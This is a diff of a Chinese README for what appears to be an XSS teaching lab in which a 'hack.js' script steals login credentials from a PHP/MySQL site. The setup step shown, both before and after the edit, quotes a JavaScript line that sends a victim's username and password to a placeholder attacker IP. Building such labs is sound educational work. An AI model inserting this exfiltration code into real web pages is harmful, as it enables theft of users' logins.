@@ -11,7 +11,7 @@ Apache HTTP Server, MySQL, PHP 7.0
 对于Linux，把代码放到 Apache 的 DocumentRoot: /var/www/html/
 Hacker 和服务器的代码分别在 hack 和 webserver文件夹里。
 然后， 在webserver/databaseAuth.txt 需要隔行分别提供MySQL的用户名和密码
-然后，在/hack/hack.js里需要把代码进行修改：script.src = 'http://#在这里写hacker的IP地址#/index.php?username=' + username + '&password='+password;
+然后，在/hack/hack.js里需要把代码进行修改 (第16行）：script.src = 'http://#在这里写hacker的IP地址#/index.php?username=' + username + '&password='+password;
 # 实验过程
 我门设定了用户 hacker 和他的密码位：78539816, 正常用户 jim123 和他的密码位：12345678 (这些可在createDatabase.sql 修改）。
 每当用户登入到网站，服务器将会在cookies里记录用户名和密码。
